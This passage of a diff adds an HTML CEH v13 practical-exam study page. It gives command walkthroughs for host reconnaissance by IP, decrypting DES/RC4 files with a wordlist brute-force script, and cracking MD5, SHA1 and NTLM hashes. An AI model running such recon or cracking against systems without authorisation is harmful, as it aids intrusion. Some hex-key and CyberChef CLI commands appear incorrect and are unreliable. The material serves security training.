+adb shell screenrecord /sdcard/demo.mp4
+# Stop with Ctrl+C after recording
+adb pull /sdcard/demo.mp4 ./
+
+# Input events (simulate keystrokes)
+adb shell input text "password123"
+adb shell input keyevent 66  # Enter key</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 14: Finding FQDN from IP Address</h4>
+                <div class="task">
+                    Task: "Target server at <span class="ip-address">10.10.50.25</span>. Identify the Fully Qualified Domain Name (FQDN) associated with this IP."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Reverse DNS Lookup</div>
+                    <pre># Using nslookup
+nslookup 10.10.50.25
+
+# Using host
+host 10.10.50.25
+
+# Using dig
+dig -x 10.10.50.25
+
+# Specify DNS server
+nslookup 10.10.50.25 8.8.8.8
+dig -x 10.10.50.25 @8.8.8.8</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Certificate Analysis (HTTPS)</div>
+                    <pre># View SSL certificate
+openssl s_client -connect 10.10.50.25:443 | openssl x509 -noout -text
+
+# Extract Common Name
+openssl s_client -connect 10.10.50.25:443 2>/dev/null | openssl x509 -noout -subject
+
+# Extract Subject Alternative Names
+echo | openssl s_client -connect 10.10.50.25:443 2>/dev/null | openssl x509 -noout -text | grep DNS:</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: SMB/NetBIOS Name Resolution</div>
+                    <pre># Using nmblookup
+nmblookup -A 10.10.50.25
+
+# Using nbtscan
+nbtscan 10.10.50.25
+
+# Using nmap
+nmap --script smb-os-discovery 10.10.50.25
+nmap --script nbstat 10.10.50.25</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: HTTP Headers Inspection</div>
+                    <pre># Check HTTP headers for hostname
+curl -I http://10.10.50.25
+curl -v http://10.10.50.25 2>&1 | grep -i "Host:"
+
+# Check for redirects
+curl -L http://10.10.50.25</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: SNMP Enumeration</div>
+                    <pre># Query SNMP for hostname
+snmpwalk -v2c -c public 10.10.50.25 1.3.6.1.2.1.1.5
+
+# Full system info
+snmpwalk -v2c -c public 10.10.50.25 system</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 15: Decrypting Files - DES and RC4</h4>
+                <div class="task">
+                    Task: "Encrypted files found: 'data_des.enc' and 'data_rc4.enc'. Key found: <code>SecretKey123</code>. Decrypt both files."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Identify Encryption Type</div>
+                    <pre># Check file header/magic bytes
+xxd data_des.enc | head
+file data_des.enc
+
+# Check for encryption indicators
+strings data_des.enc
+
+# Calculate entropy (high = encrypted)
+ent data_des.enc</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Decrypt DES Encrypted File</div>
+                    <pre># Using OpenSSL - DES-CBC
+openssl des-cbc -d -in data_des.enc -out data_des.txt -k SecretKey123
+
+# DES-ECB mode
+openssl des-ecb -d -in data_des.enc -out data_des.txt -k SecretKey123
+
+# DES3 (Triple DES)
+openssl des3 -d -in data_des.enc -out data_des.txt -k SecretKey123
+
+# With hex key
+openssl des-cbc -d -in data_des.enc -out data_des.txt -K 536563726574 -iv 0000000000000000
+
+# Verify decryption
+cat data_des.txt
+file data_des.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Decrypt RC4 Encrypted File</div>
+                    <pre># Using OpenSSL - RC4
+openssl rc4 -d -in data_rc4.enc -out data_rc4.txt -k SecretKey123
+
+# With hex key
+openssl rc4 -d -in data_rc4.enc -out data_rc4.txt -K 53656372657404b657931323
+
+# Verify output
+cat data_rc4.txt
+file data_rc4.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Python Script for RC4 Decryption</div>
+                    <pre># Create Python script: decrypt_rc4.py
+from Crypto.Cipher import ARC4
+import sys
+
+def decrypt_rc4(filename, key):
+    with open(filename, 'rb') as f:
+        ciphertext = f.read()
+    
+    cipher = ARC4.new(key.encode())
+    plaintext = cipher.decrypt(ciphertext)
+    
+    with open(filename + '.dec', 'wb') as f:
+        f.write(plaintext)
+    print(f"Decrypted: {filename}.dec")
+
+# Usage
+decrypt_rc4('data_rc4.enc', 'SecretKey123')
+
+# Run script
+python3 decrypt_rc4.py</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Brute Force Key if Unknown</div>
+                    <pre># Create wordlist-based brute force script
+#!/bin/bash
+# brute_des.sh
+
+ENCRYPTED_FILE="data_des.enc"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+while IFS= read -r password; do
+    openssl des-cbc -d -in "$ENCRYPTED_FILE" -out test.txt -k "$password" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        if strings test.txt | grep -q "flag\|password\|admin"; then
+            echo "[+] Key found: $password"
+            cat test.txt
+            break
+        fi
+    fi
+done < "$WORDLIST"
+
+# Make executable and run
+chmod +x brute_des.sh
+./brute_des.sh</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 6: Using CyberChef for Decryption</div>
+                    <pre># Manual method using CyberChef (browser-based)
+# 1. Go to https://gchq.github.io/CyberChef/
+# 2. Upload encrypted file
+# 3. Add "DES Decrypt" or "RC4" operation
+# 4. Enter key: SecretKey123
+# 5. Select mode (CBC, ECB, etc.)
+# 6. Download decrypted output
+
+# Command-line alternative with Node.js
+npm install -g cyberchef
+cyberchef --recipe 'DES_Decrypt' --key 'SecretKey123' data_des.enc</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 7: Analyze Decrypted Content</div>
+                    <pre># Search for flags or sensitive data
+strings data_des.txt | grep -i "flag\|password\|user"
+cat data_des.txt | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
+
+# Extract credentials
+grep -E "username|password|admin" data_des.txt
+
+# Check file type if binary
+file data_des.txt
+binwalk data_des.txt</pre>
+                </div>
+            </div>
+
+            <div class="scenario">
+                <h4>Scenario 16: Hash Cracking & Password Recovery</h4>
+                <div class="task">
+                    Task: "Hashes found in database at <span class="ip-address">10.10.40.80</span>. Crack MD5, SHA1, and NTLM hashes to recover passwords."
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 1: Identify Hash Type</div>
+                    <pre># Using hash-identifier
+hash-identifier
+# Paste hash: 5f4dcc3b5aa765d61d8327deb882cf99
+
+# Using hashid
+hashid '5f4dcc3b5aa765d61d8327deb882cf99'
+hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'  # Show hashcat mode
+
+# Manual identification
+# MD5: 32 characters
+# SHA1: 40 characters
+# SHA256: 64 characters
+# NTLM: 32 characters (similar to MD5)</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 2: Crack MD5 Hashes</div>
+                    <pre># Create hash file
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > md5_hashes.txt
+
+# Hashcat
+hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# John the Ripper
+john --format=Raw-MD5 md5_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Show cracked passwords
+hashcat -m 0 md5_hashes.txt --show
+john --show md5_hashes.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 3: Crack SHA1 Hashes</div>
+                    <pre># SHA1 hash file
+echo "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" > sha1_hashes.txt
+
+# Hashcat (mode 100 for SHA1)
+hashcat -m 100 sha1_hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# John the Ripper
+john --format=Raw-SHA1 sha1_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 4: Crack NTLM Hashes</div>
+                    <pre># NTLM hash
+echo "31d6cfe0d16ae931b73c59d7e0c089c0" > ntlm_hashes.txt
+
+# Hashcat (mode 1000 for NTLM)
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# With rules for better success
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</pre>
+                </div>
+
+                <div class="command-block">
+                    <div class="command-title">Step 5: Online Hash Lookup</div>
+                    <pre># Using curl to check online databases
+curl "https://md5decrypt.net/en/Api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=test@test.com&code=CODE"
+
+# CrackStation lookup (manual)
+# Visit: https://crackstation.net/
+# Paste hash and check
+
+# Or use hash lookup tools
+hash-lookup 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+                </div>
+            </div>
+
+            <h2>Legitimate Resources for CEH v13 Practical Preparation</h2>
+
+            <div class="resource-box">
+                <h4>1. Official EC-Council Material</h4>
+                <p>The most important resource:</p>
+                <ul>
+                    <li>Official CEH v13 courseware</li>
+                    <li>iLabs (Cyber Range) provided by EC-Council - closest to exam environment</li>
+                    <li>CEH Practical Handbook from EC-Council</li>
+                </ul>
+            </div>
+
+            <div class="resource-box">
+                <h4>2. Practice on Your Own Range</h4>
+                <p>Set up a home lab with:</p>
+                <ul>
+                    <li><strong>VulnHub VMs:</strong> Download intentionally vulnerable virtual machines</li>
+                    <li><strong>TryHackMe / HackTheBox:</strong> Guided learning paths and real-world-like machines</li>
+                    <li>Start with "Easy" boxes on HTB or "Offensive Pentesting" path on TryHackMe</li>
+                </ul>
+            </div>
+
+            <div class="resource-box">
+                <h4>3. Study the Blueprint</h4>
+                <p>The official exam blueprint from EC-Council outlines all domains and skills tested. Focus your practice on these areas.</p>
+            </div>
+
+            <div class="emphasis">
+                By using these legitimate methods, you will genuinely learn the skills - which is the entire point of a practical exam. This approach ensures you are both ethical in your preparation and fully prepared to pass the exam on your own merit.
+            </div>
+        </div>
+
+        <div class="footer">
+            Study ethically. Learn genuinely. Succeed with integrity.
+        </div>
+    </div>
+</body>
+</html>
